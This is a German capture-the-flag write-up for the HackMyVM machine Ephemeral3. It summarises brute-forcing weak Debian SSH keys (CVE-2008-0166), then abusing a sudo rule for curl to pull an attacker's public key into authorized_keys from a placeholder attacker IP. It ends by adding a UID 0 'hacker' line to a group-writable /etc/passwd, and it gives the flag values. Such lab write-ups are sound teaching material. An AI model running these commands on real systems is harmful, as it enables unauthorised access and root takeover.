# Ephemeral3 - HackMyVM (Easy)

![Ephemeral3.png](Ephemeral3.png)

## Übersicht

*   **VM:** Ephemeral3
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Ephemeral3)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 2022-10-04
*   **Original-Writeup:** https://alientec1908.github.io/Ephemeral3_HackMyVM_Easy/
*   **Autor:** Ben C.

## Kurzbeschreibung

Ziel dieser Challenge war die Kompromittierung der virtuellen Maschine "Ephemeral3" auf der HackMyVM-Plattform, um sowohl die User- als auch die Root-Flag zu erlangen. Der Lösungsweg begann mit Web-Enumeration, die auf eine bekannte Schwachstelle bei der SSH-Schlüsselgenerierung (CVE-2008-0166) hinwies. Diese wurde für den initialen Zugriff als Benutzer `randy` ausgenutzt. Die erste Rechteausweitung auf den Benutzer `henry` erfolgte durch eine unsichere `sudo`-Konfiguration für `curl`. Schließlich wurden Root-Rechte durch das Ausnutzen von Schreibrechten der Gruppe `henry` auf die Datei `/etc/passwd` erlangt, indem ein neuer Benutzer mit Root-Privilegien hinzugefügt wurde.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `vi` / Texteditor (`nano`)
*   `nmap`
*   `nikto`
*   `gobuster`
*   `wget`
*   `cat`
*   Web Browser / Google
*   Exploit-DB (Website)
*   `mkdir`
*   `tar`
*   `python2` (für Exploit CVE-2008-0166)
*   `ssh`
*   `sudo`
*   `curl`
*   `python3` (für HTTP-Server)
*   `ss`
*   `find`
*   `mkpasswd`
*   `su`
*   Standard Linux-Befehle (`ls`, `cat`, `find`, etc.)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Ephemeral3" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Enumeration:**
    *   IP-Findung mittels `arp-scan` (192.168.2.115).
    *   Umfassender Portscan mit `nmap` identifizierte offene Ports: 22/tcp (OpenSSH 8.2p1 Ubuntu) und 80/tcp (Apache httpd 2.4.41 Ubuntu).

2.  **Web Enumeration:**
    *   `nikto` lieferte allgemeine Informationen zum Apache-Server.
    *   `gobuster` fand das Verzeichnis `/agency` und die Datei `/note.txt`.
    *   Der Inhalt von `/note.txt` (`wget`, `cat`) enthielt einen Hinweis auf mit OpenSSL generierte Schlüssel und die E-Mail `henry@ephemeral.com`, was auf CVE-2008-0166 hindeutete.
    *   Weitere Enumeration von `/agency` (z.B. `contact.html`) lieferte potenzielle Benutzernamen wie `randy`.

3.  **Initial Access (CVE-2008-0166 - Schwache SSH-Schlüssel):**
    *   Recherche auf Exploit-DB (z.B. 5720) führte zum Download eines Pakets mit schwachen Debian OpenSSL SSH-Schlüsseln (oft `5622.tar.bz2`).
    *   Ein Python2-Skript wurde verwendet, um die Sammlung von RSA-2048-Schlüsseln gegen den SSH-Dienst für den Benutzer `randy` auf `ephemeral.com` zu testen.
    *   Ein funktionierender privater Schlüssel wurde gefunden (`rsa/2048/0028ca6d22c68ed0a1e3f6f79573100a-31671`).
    *   Erfolgreicher SSH-Login als `randy` mit dem kompromittierten Schlüssel.

4.  **Privilege Escalation (von `randy` zu `henry`):**
    *   `sudo -l` für `randy` offenbarte die Berechtigung: `(henry) NOPASSWD: /usr/bin/curl`.
    *   Ein Python3-HTTP-Server wurde auf dem Angreifer-System gestartet, um den eigenen öffentlichen SSH-Schlüssel (`id_rsa.pub`) bereitzustellen.
    *   Mit `sudo -u henry curl http://<ANGREIFER-IP>/id_rsa.pub -o /home/henry/.ssh/authorized_keys` wurde der Angreifer-Schlüssel in `henry`s `authorized_keys`-Datei geschrieben.
    *   SSH-Login als `henry` mit dem eigenen privaten Schlüssel war nun möglich. Die User-Flag (`user.txt`) wurde im Home-Verzeichnis von `henry` gefunden.

5.  **Privilege Escalation (von `henry` zu root):**
    *   Die Überprüfung der Dateiberechtigungen mit `ls -la /etc/passwd` zeigte, dass die Gruppe `henry` Schreibrechte auf die Datei hatte (`-rw-rw-r-- 1 root henry ...`).
    *   Mit `mkpasswd -m sha-512` wurde ein Passwort-Hash für einen neuen Benutzer `hacker` generiert.
    *   Die Datei `/etc/passwd` wurde mit `nano` bearbeitet und eine neue Zeile für den Benutzer `hacker` mit UID/GID 0 und dem generierten Hash hinzugefügt: `hacker:$6$HASH...:0:0:root:/root:/bin/bash`.
    *   Mit `su hacker` und dem zuvor gewählten Passwort konnte eine Root-Shell erlangt werden. Die Root-Flag (`root.txt`) wurde im Home-Verzeichnis von Root gefunden.

## Wichtige Schwachstellen und Konzepte

*   **Schwache SSH-Schlüssel (CVE-2008-0166):** Aufgrund einer alten Schwachstelle in OpenSSL auf Debian-basierten Systemen wurden SSH-Schlüssel aus einem vorhersagbaren, stark begrenzten Satz generiert. Ein Exploit-Paket mit diesen bekannten schwachen Schlüsseln wurde verwendet, um den privaten Schlüssel für den Benutzer `randy` zu finden und sich per SSH anzumelden.
*   **Unsichere `sudo`-Konfiguration (`curl`):** Dem Benutzer `randy` wurde erlaubt, den Befehl `curl` als Benutzer `henry` ohne Passworteingabe auszuführen. Dies wurde ausgenutzt, um den öffentlichen SSH-Schlüssel des Angreifers herunterzuladen und in die `authorized_keys`-Datei des Zielbenutzers `henry` zu schreiben, was einen direkten SSH-Zugang als `henry` ermöglichte.
*   **Unsichere Dateiberechtigungen (`/etc/passwd` schreibbar durch Gruppe):** Die Datei `/etc/passwd` war für die Gruppe `henry` schreibbar. Da der Benutzer `henry` Mitglied seiner eigenen Gruppe war, konnte er die Datei modifizieren. Dies erlaubte das Hinzufügen eines neuen Benutzers mit UID 0 (Root-Rechten) und einem bekannten Passwort-Hash, was zur vollständigen Kompromittierung des Systems führte.
*   **SSH Key Brute-Forcing (via CVE-2008-0166):** Anstatt Passwörter zu knacken, wurde hier eine Sammlung bekannter, schwacher SSH-Privatschlüssel gegen den SSH-Dienst des Ziels für bestimmte Benutzernamen getestet, um einen gültigen Schlüssel für den initialen Zugriff zu finden.

## Flags

*   **User Flag (`/home/henry/user.txt`):** `9c8e36b0cb30f09300592cb56bca0c3a`
*   **Root Flag (`/root/root.txt`):** `b0a3dec84d09f03615f768c8062cec4d`

## Tags

`HackMyVM`, `Ephemeral3`, `Easy`, `CVE-2008-0166`, `WeakSSHKekys`, `SudoCurl`, `ETCPasswdWritable`, `FilePermissions`, `Linux`, `WebEnumeration`, `Privilege Escalation`
